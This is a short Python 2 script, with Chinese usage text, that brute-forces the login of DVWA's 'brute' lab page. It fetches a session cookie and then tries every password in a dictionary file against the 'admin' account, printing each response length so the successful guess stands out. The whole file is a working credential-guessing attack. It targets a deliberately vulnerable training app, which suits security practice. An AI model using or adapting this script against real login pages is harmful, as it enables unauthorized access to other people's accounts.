import httplib2
import sys



argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "用法：python",sys.argv[0],"IP地址 端口号"
    print "例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"
    sys.exit()

ip = "192.168.109.147"
port = "80"

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]
	
h=httplib2.Http( )
url="http://"+ip+":"+port+"/DVWA-master/vulnerabilities/brute/"
response,content=h.request(url)
cookie=response["Set-Cookie"]
header={"cookie":cookie}
filepasswords=open("dict.txt","r")
passwords=filepasswords.readlines()
for password in passwords:
    tmp=url+"?username=admin"+"&password="+password[:-1]+"&Login=Login"
    res,content=h.request(tmp,"GET","",header)
    print res["content-length"]+":"+"admin"+":"+password[:-1]+"\n"
    
